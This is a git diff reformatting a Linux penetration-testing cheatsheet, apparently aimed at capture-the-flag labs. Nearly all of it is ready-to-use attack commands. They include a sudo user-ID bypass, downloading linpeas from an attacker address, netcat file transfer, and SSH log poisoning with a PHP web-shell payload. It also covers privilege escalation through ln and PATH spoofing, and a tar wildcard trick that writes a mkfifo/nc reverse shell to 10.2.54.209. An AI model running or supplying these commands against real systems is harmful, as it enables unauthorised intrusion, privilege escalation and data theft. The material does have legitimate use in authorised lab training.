@@ -1,7 +1,7 @@
 ---
 title: "Cheatsheet"
 ---
-# Linux
+## Linux
 
 ### Stablilize Shell
 1. ctrl+z
@@ -10,52 +10,87 @@ title: "Cheatsheet"
 4. export TERM=xterm , for using `clear` command
 
 ### Spawn bash
-* /usr/bin/script -qc /bin/bash 1&>/dev/null
-* python -c 'import pty;pty.spawn("/bin/bash")'
-* python3 -c 'import pty;pty.spawn("/bin/bash")'
+* `/usr/bin/script -qc /bin/bash 1&>/dev/null`
+* `python -c 'import pty;pty.spawn("/bin/bash")'`
+* `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
 ### Vulnerable sudo (ALL,!root)
-`sudo -u#-1 whoami`<br />
-`sudo -u#-1 <path_of_executable_as_other_user>`
+- `sudo -u#-1 whoami`<br />
+- `sudo -u#-1 <path_of_executable_as_other_user>`
 
 ### Linpeas
-wget 10.11.25.205:8080/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh > linlog.txt
-less -R linlog.txt
+```bash
+$ wget 10.11.25.205:8080/linpeas.sh
+$ chmod +x linpeas.sh
+$ ./linpeas.sh > linlog.txt
+$ less -R linlog.txt
+```
 
 ### Execute as diffent user
-`sudo -u <user> <command>`
-
-### SUID and SGID
-find / -perm /6000 2>/dev/null
+```bash
+$ sudo -u <user> <command>
+```
 
 ### FTP
-Connect to ftp on the machine<br/>
-`ftp user <ip>`
-After successfully logged in you can download all files with
-`mget *`
-Download files recusively<br/>
-` wget -r ftp://user:pass@<ip>/  `
+- Connect to ftp on the machine
+
+    ```bash
+    $ ftp user <ip>
+    $ ftp <ip>
+    ```
+
+- Download files:
+
+    ```bash
+    # Download all files
+    ftp> mget *
+
+    # Download file
+    ftp> get file_name
+    ```
+
+- Download files recusively:
+
+    ```bash
+    $ wget -r ftp://user:pass@<ip>/
+    ```
 
 
 ### SMB Shares
 
-#### SmbClient
-* `smbclient -L \\\\<ip\\`     listing all shares
-* `smbclient \\\\<ip>\\<share>` accessing a share anonymously
-* `smbclient \\\\10.10.209.122\\<share> -U <share> `accessing a share with an authorized user
+- SmbClient
 
-#### Smbmap
-* `smbmap -u <username> -p <password> -H <ip>`
+    ```bash
+    # Listing all shares
+    $ smbclient -L \\\\<ip\\
 
-#### Smbget
+    # Accessing a share anonymously
+    $ smbclient \\\\<ip>\\<share>
 
-* `smbget -R smb://<ip>/<share>` 
+    # accessing a share with an authorized user
+    $ smbclient \\\\10.10.209.122\\<share> -U <share> 
+    ```
+
+- Smbmap
+
+    ```bash
+    $ smbmap -u <username> -p <password> -H <ip>
+    ```
+
+- Smbget
+
+    ```bash
+    $ smbget -R smb://<ip>/<share>
+    ```
 
 ### NFS shares
-* `showmount -e <ip> ` This lists the nfs shares
-* `mount -t nfs <ip>:/<share_name> <directory_where_to_mount>` Mounting that share
+```bash
+# This lists the nfs shares
+$ showmount -e <ip>
+
+# Monting shares
+$ mount -t nfs <ip>:/<share_name> <directory_where_to_mount>
+```
 
 ### Cronjobs
 
@@ -66,115 +101,119 @@ Download files recusively<br/>
 
 ### Finding Binaries
 
-* find . - perm /4000 (user id uid) 
-* find . -perm /2000 (group id guid)
+* `find . - perm /4000` (user id uid) 
+* `find . -perm /2000` (group id guid)
+* `find / -perm /6000 2>/dev/null` (SUID and GUID)
 
 ### Finding File capabilites
-
-`getcap -r / 2>/dev/null`
+```bash
+$ getcap -r / 2>/dev/null
+```
 
 ### Finding text in a files
-`grep -rnw '/path/to/somewhere/' -e 'pattern'
-`
-### Changing file attributes
+```bash
+$ grep -rnw '/path/to/somewhere/' -e 'pattern'
+```
 
-chattr + i filename `making file immutable`<br/>
-chattr -i filename `making file mutable`<br/>
-lschattr filename `Checking file attributes`
+### Changing file attributes
+- `chattr + i filename` making file immutable
+- `chattr -i filename` making file mutable
+- `lschattr filename` checking file attributes
 
 ### Uploading Files
-
-scp file/you/want `user@ip`:/path/to/store <br/>
-python -m SimpleHTTPServer [port] `By default will listen on 8000`<br/>
-python3 -m http.server [port] `By default will listen on 8000`<br/>
+- `scp file/you/want user@ip:/path/to/store `
+- `python -m SimpleHTTPServer [port]` By default will listen on 8000
+- `python3 -m http.server [port]` By default will listen on 8000
 
 ### Downloading Files
-
-`wget http://<ip>:port/<file>`
+```bash
+$ wget http://<ip>:port/<file>
+```
 
 ### Netcat to download files from target
+- `nc -l -p [port] > file` Receive file
+- `nc -w 3 [ip] [port] < file` Send file 
 
-`nc -l -p [port] > file` Receive file <br/>
-`nc -w 3 [ip] [port] < file `Send file <br/>
-
-### Cracaking Zip Archive
-
-`fcrackzip -u -D -p <path_to_wordlist> <archive.zip>`
+### Cracking Zip Archive
+```bash
+$ fcrackzip -u -D -p <path_to_wordlist> <archive.zip>
+```
 
 ### Decrypting PGP key
 If you have `asc` key which can be used for PGP authentication then 
-* john key.asc > asc_hash
-* john asc_hash --wordlists=path_to_wordlist
+* `john key.asc > asc_hash`
+* `john asc_hash --wordlists=path_to_wordlist`
 
 #### Having pgp cli
-* pgp --import key.asc
-* pgp --decrypt file.pgp
-
-#### Having gpg cli
-* gpg --import key.asc
-* gpg --decrypt file.pgp
+* `pgp --import key.asc`
+* `pgp --decrypt file.pgp`
 
 ### killing a running job in same shell
-`jobs`
-
-```
-Find it's job number
-
+```bash
+# Find it's job number
 $ jobs
 [1]+  Running                 sleep 100 &
 
+# Kill the jobs
 $ kill %1
 [1]+  Terminated              sleep 100
-
 ```
+
 ### SSH Port Forwarding
-`ssh -L <port_that_is_blockd_>:localhost:<map_blocked_port> <username>@<ip>`
+```bash
+$ ssh -L <port_that_is_blocked_>:localhost:<map_blocked_port> <username>@<ip>
+```
 
 ### SSH auth log poisoning
+- Login as any user to see that it gets logged then try to login with a malicious php code
 
-Login as any user to see that it gets logged then try to login with a malicious php code
+    ```bash
+    $ ssh '<?php system($_GET['a']); ?>'@192.168.43.2
+    ```
 
-`ssh '<?php system($_GET['a']); ?>'@192.168.43.2` 
+- Then 
 
-Then `http://ip/page?a=whoami;`
+    ```
+    http://ip/page?a=whoami;
+    ```
 
 ### Getting root with ln (symlink)
-
 If we have permissions to run /usr/bin/ln as root we can onw the machine
-```
-echo 'bash' > root
-chmod +x root 
-sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
-sudo /usr/bin/ln
 
+```bash
+$ echo 'bash' > root
+$ chmod +x root 
+$ sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
+$ sudo /usr/bin/ln
 ```
 
 ### Tar Exploitation
+When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory 
 
-When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory <br/ >
+```bash
+$ echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+$ echo "" > --checkpoint=1
 ```
-echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
-echo "" > "--checkpoint-action=exec=sh shell.sh"
-echo "" > --checkpoint=1
+
+### Binary Exploits (PATH Spoofing)
+If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed
+```bash
+$ export PATH=<path_where_binary_is>/:$PATH
+# Example: `export PATH=/tmp:$PATH`
 ```
-
-### Binary Exploits
-If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed<br/>
-`export PATH=<path_where_binary_is>/:$PATH`
-
-Example: `export PATH=/tmp:$PATH`
 
 ### Enumeration 
-* cat /etc/*release 
-* cat /etc/issue 
-* cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
-* lsb_release -a
+* `cat /etc/*release` 
+* `cat /etc/issue `
+* `cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release`
+* `lsb_release -a`
 * Running Linpeas
-* ss -tulpn (for ports that are open on the machine)
+* `ss -tulpn` (for ports that are open on the machine)
 
 ## Allow restricted ports at Mozilla Firefox
-about:config
-network.security.ports.banned.override
+- `about:config`
+- `network.security.ports.banned.override` Set your port in string
 
 
 
